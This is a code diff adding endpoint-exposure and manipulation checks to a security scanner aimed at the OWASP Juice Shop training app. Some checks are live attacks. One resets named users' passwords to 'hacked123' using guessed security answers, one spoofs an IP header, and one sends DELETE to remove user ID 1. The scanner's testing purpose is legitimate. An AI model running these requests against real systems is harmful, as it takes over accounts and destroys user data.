@@ -197,6 +197,15 @@ class JuiceShopScanner(BaseScanner):
         self._test_exposed_support_chat(target)
         self._test_login_admin_password(target)
 
+        # Phase 11: Additional endpoint exposure & manipulation checks
+        self._test_exposed_memories(target)
+        self._test_exposed_deliverys(target)
+        self._test_password_reset_manipulation(target)
+        self._test_exposed_save_login_ip(target)
+        self._test_exposed_wallet_balance(target)
+        self._test_exposed_basket_items(target)
+        self._test_http_verb_tampering_delete_user(target)
+
     # ── Injection checks ────────────────────────────────────────────
 
     def _test_sqli_login(self, target: str) -> bool:
@@ -2354,4 +2363,269 @@ class JuiceShopScanner(BaseScanner):
                     return True
             except Exception:
                 continue
+        return False
+
+    # ── Phase 11: Additional endpoint exposure & manipulation checks ──
+
+    def _test_exposed_memories(self, target: str) -> bool:
+        """Test exposed /rest/memories endpoint leaking user photos/memories."""
+        try:
+            resp = self.http_client.get(
+                f"{target}/rest/memories",
+                headers=self._auth_headers(),
+                timeout=10,
+            )
+            if resp.status_code == 200:
+                data = json.loads(resp.text) if resp.text else {}
+                items = data.get("data", [])
+                if isinstance(items, list) and len(items) >= 0:
+                    self.add_finding(
+                        title="Exposed /rest/memories Endpoint — User Memories Leak",
+                        severity=Severity.MEDIUM,
+                        description=(
+                            "The /rest/memories endpoint is accessible and may expose "
+                            "user-uploaded photos and captions belonging to other users."
+                        ),
+                        recommendation="Restrict /rest/memories to only return the authenticated user's own data.",
+                        evidence=(
+                            f"GET /rest/memories returned HTTP {resp.status_code}\n"
+                            f"Response: {resp.text[:300]}"
+                        ),
+                        url=f"{target}/rest/memories",
+                        cwe="CWE-200",
+                    )
+                    return True
+        except Exception:
+            pass
+        return False
+
+    def _test_exposed_deliverys(self, target: str) -> bool:
+        """Test exposed /api/Deliverys endpoint leaking delivery address data."""
+        try:
+            resp = self.http_client.get(
+                f"{target}/api/Deliverys",
+                headers=self._auth_headers(),
+                timeout=10,
+            )
+            if resp.status_code == 200:
+                data = json.loads(resp.text) if resp.text else {}
+                if data.get("data") is not None or data.get("status") == "success":
+                    self.add_finding(
+                        title="Exposed /api/Deliverys Endpoint — Delivery Data Leak",
+                        severity=Severity.MEDIUM,
+                        description=(
+                            "The /api/Deliverys endpoint is accessible and returns delivery "
+                            "method/address data. This may expose internal logistics information."
+                        ),
+                        recommendation="Restrict access to delivery data to authorized roles only.",
+                        evidence=(
+                            f"GET /api/Deliverys returned HTTP {resp.status_code}\n"
+                            f"Response: {resp.text[:300]}"
+                        ),
+                        url=f"{target}/api/Deliverys",
+                        cwe="CWE-200",
+                    )
+                    return True
+        except Exception:
+            pass
+        return False
+
+    def _test_password_reset_manipulation(self, target: str) -> bool:
+        """Test password reset with manipulated security answer."""
+        payloads = [
+            {
+                "email": "jim@juice-sh.op",
+                "answer": "Samuel",
+                "new": "hacked123",
+                "repeat": "hacked123",
+            },
+            {
+                "email": "bender@juice-sh.op",
+                "answer": "Stop'n'Drop",
+                "new": "hacked123",
+                "repeat": "hacked123",
+            },
+        ]
+        for payload in payloads:
+            try:
+                resp = self.http_client.post(
+                    f"{target}/rest/user/reset-password",
+                    json=payload,
+                    headers={"Content-Type": "application/json"},
+                    timeout=10,
+                )
+                if resp.status_code == 200:
+                    self.add_finding(
+                        title="Password Reset Manipulation — Security Answer Guessable",
+                        severity=Severity.HIGH,
+                        description=(
+                            f"Password reset for {payload['email']} succeeded with a guessed "
+                            f"security answer ('{payload['answer']}'). An attacker can take over "
+                            f"accounts by researching publicly available answers."
+                        ),
+                        recommendation=(
+                            "Use multi-factor authentication for password resets. "
+                            "Do not rely solely on security questions."
+                        ),
+                        evidence=(
+                            f"POST /rest/user/reset-password\n"
+                            f"Payload: {json.dumps(payload)}\n"
+                            f"Response: HTTP {resp.status_code} — {resp.text[:200]}"
+                        ),
+                        url=f"{target}/rest/user/reset-password",
+                        cwe="CWE-640",
+                    )
+                    return True
+            except Exception:
+                continue
+        return False
+
+    def _test_exposed_save_login_ip(self, target: str) -> bool:
+        """Test /rest/saveLoginIp accepting arbitrary IP injection."""
+        try:
+            headers = self._auth_headers()
+            headers["True-Client-IP"] = "1.2.3.4"
+            resp = self.http_client.get(
+                f"{target}/rest/saveLoginIp",
+                headers=headers,
+                timeout=10,
+            )
+            if resp.status_code == 200:
+                data = json.loads(resp.text) if resp.text else {}
+                stored_ip = str(data)
+                if "1.2.3.4" in stored_ip:
+                    self.add_finding(
+                        title="Exposed /rest/saveLoginIp — IP Header Injection",
+                        severity=Severity.MEDIUM,
+                        description=(
+                            "The /rest/saveLoginIp endpoint trusts the True-Client-IP header, "
+                            "allowing an attacker to inject arbitrary IP addresses into user records. "
+                            "This can be used for log spoofing or XSS via stored IP."
+                        ),
+                        recommendation="Do not trust client-supplied IP headers. Use server-determined remote address.",
+                        evidence=(
+                            f"GET /rest/saveLoginIp with True-Client-IP: 1.2.3.4\n"
+                            f"Response: {resp.text[:300]}"
+                        ),
+                        url=f"{target}/rest/saveLoginIp",
+                        cwe="CWE-346",
+                    )
+                    return True
+        except Exception:
+            pass
+        return False
+
+    def _test_exposed_wallet_balance(self, target: str) -> bool:
+        """Test exposed /rest/wallet/balance endpoint."""
+        try:
+            resp = self.http_client.get(
+                f"{target}/rest/wallet/balance",
+                headers=self._auth_headers(),
+                timeout=10,
+            )
+            if resp.status_code == 200:
+                data = json.loads(resp.text) if resp.text else {}
+                if data.get("data") is not None or "money" in resp.text.lower() or "balance" in resp.text.lower():
+                    self.add_finding(
+                        title="Exposed /rest/wallet/balance — Wallet Balance Disclosure",
+                        severity=Severity.MEDIUM,
+                        description=(
+                            "The /rest/wallet/balance endpoint returns wallet balance data. "
+                            "Without proper authorization checks, any authenticated user may "
+                            "view or manipulate wallet balances."
+                        ),
+                        recommendation="Enforce strict authorization on wallet endpoints. Validate user ownership.",
+                        evidence=(
+                            f"GET /rest/wallet/balance returned HTTP {resp.status_code}\n"
+                            f"Response: {resp.text[:300]}"
+                        ),
+                        url=f"{target}/rest/wallet/balance",
+                        cwe="CWE-200",
+                    )
+                    return True
+        except Exception:
+            pass
+        return False
+
+    def _test_exposed_basket_items(self, target: str) -> bool:
+        """Test exposed /api/BasketItems endpoint leaking basket item data."""
+        try:
+            resp = self.http_client.get(
+                f"{target}/api/BasketItems",
+                headers=self._auth_headers(),
+                timeout=10,
+            )
+            if resp.status_code == 200:
+                data = json.loads(resp.text) if resp.text else {}
+                if data.get("data") is not None or data.get("status") == "success":
+                    self.add_finding(
+                        title="Exposed /api/BasketItems — Basket Data Leak",
+                        severity=Severity.MEDIUM,
+                        description=(
+                            "The /api/BasketItems endpoint is accessible and returns basket "
+                            "item data. This may expose other users' shopping cart contents "
+                            "if authorization is insufficient."
+                        ),
+                        recommendation="Restrict /api/BasketItems to return only the authenticated user's items.",
+                        evidence=(
+                            f"GET /api/BasketItems returned HTTP {resp.status_code}\n"
+                            f"Response: {resp.text[:300]}"
+                        ),
+                        url=f"{target}/api/BasketItems",
+                        cwe="CWE-200",
+                    )
+                    return True
+        except Exception:
+            pass
+        return False
+
+    def _test_http_verb_tampering_delete_user(self, target: str) -> bool:
+        """Test HTTP verb tampering — attempt DELETE on /api/Users/1."""
+        try:
+            resp = self.http_client.delete(
+                f"{target}/api/Users/1",
+                headers=self._auth_headers(),
+                timeout=10,
+            )
+            if resp.status_code == 200:
+                self.add_finding(
+                    title="HTTP Verb Tampering — DELETE /api/Users/1 Accepted",
+                    severity=Severity.CRITICAL,
+                    description=(
+                        "The DELETE method on /api/Users/1 succeeded (HTTP 200). "
+                        "An attacker can delete the admin user (ID 1) or other users "
+                        "via HTTP verb tampering."
+                    ),
+                    recommendation=(
+                        "Disable dangerous HTTP methods on sensitive endpoints. "
+                        "Enforce strict authorization for DELETE operations."
+                    ),
+                    evidence=(
+                        f"DELETE /api/Users/1 returned HTTP {resp.status_code}\n"
+                        f"Response: {resp.text[:300]}"
+                    ),
+                    url=f"{target}/api/Users/1",
+                    cwe="CWE-650",
+                )
+                return True
+            elif resp.status_code in (401, 403):
+                self.add_finding(
+                    title="HTTP Verb Tampering — DELETE Method Routed on /api/Users",
+                    severity=Severity.LOW,
+                    description=(
+                        f"DELETE /api/Users/1 returned HTTP {resp.status_code}, meaning the "
+                        f"DELETE verb is routed for this endpoint. A privileged attacker or "
+                        f"token escalation could allow user deletion."
+                    ),
+                    recommendation="Disable DELETE method on user endpoints or restrict to super-admin only.",
+                    evidence=(
+                        f"DELETE /api/Users/1 returned HTTP {resp.status_code}\n"
+                        f"Response: {resp.text[:300]}"
+                    ),
+                    url=f"{target}/api/Users/1",
+                    cwe="CWE-650",
+                )
+                return True
+        except Exception:
+            pass
         return False
